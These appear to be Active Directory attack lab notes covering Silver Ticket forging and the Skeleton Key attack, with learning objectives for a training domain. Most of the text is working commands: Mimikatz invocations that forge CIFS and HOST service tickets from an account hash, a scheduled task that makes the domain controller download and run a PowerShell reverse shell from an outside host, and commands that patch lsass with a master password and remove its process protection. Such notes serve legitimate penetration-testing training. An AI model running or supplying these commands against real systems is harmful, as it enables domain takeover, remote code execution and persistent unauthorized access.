# Silver Tickets

• A valid TGS (Golden ticket is TGT).

• Encrypted and Signed by the NTLM hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.

• Services rarely check PAC (Privileged Attribute Certificate).

• Services will allow access only to the services themselves.

• Reasonable persistence period (default 30 days for computer accounts).

#### Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorpdc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

![image](https://user-images.githubusercontent.com/40224197/211092932-bf2aa3a3-c1a2-43fb-8954-1238cfa72bc7.png)
![image](https://user-images.githubusercontent.com/40224197/211092967-4012af73-7d9e-4d4a-bca3-7e8bb7a1a0a8.png)

#### Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

#### Schedule and execute a task.
```cmd
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'" 

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```

# Learning Objective 9 

Try to get command execution on the domain controller by creating silver ticket for:

– HOST service

– WMI

# Skeleton Key

- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.

- NOT persistent across reboots

#### Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

#### Now, it is possible to access any machine with a valid username and password as "mimikatz"
```powershell
Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
```

#### In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
```cmd
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

# Learning Objective 10

Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.


